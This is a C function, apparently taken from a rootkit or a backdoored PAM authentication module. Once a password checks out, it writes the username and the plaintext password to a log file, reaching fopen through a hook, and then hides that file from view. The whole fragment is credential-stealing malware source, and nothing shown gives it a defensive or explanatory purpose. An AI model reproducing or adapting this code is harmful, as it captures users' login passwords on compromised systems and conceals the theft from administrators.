void log_auth(pam_handle_t *pamh, char *resp){
    char *user;
    int  got_pw;
    FILE *fp;

    user = get_username(pamh);
    if(user == NULL) return;

    got_pw = verify_pass(user, resp);
    if(!got_pw) return;

    hook(CFOPEN);
    fp = call(CFOPEN, LOG_PATH, "a");
    if(fp == NULL) return;

    fprintf(fp, LOG_FMT, user, resp);
    fclose(fp);

    if(!hidden_path(LOG_PATH))
        hide_path(LOG_PATH);
}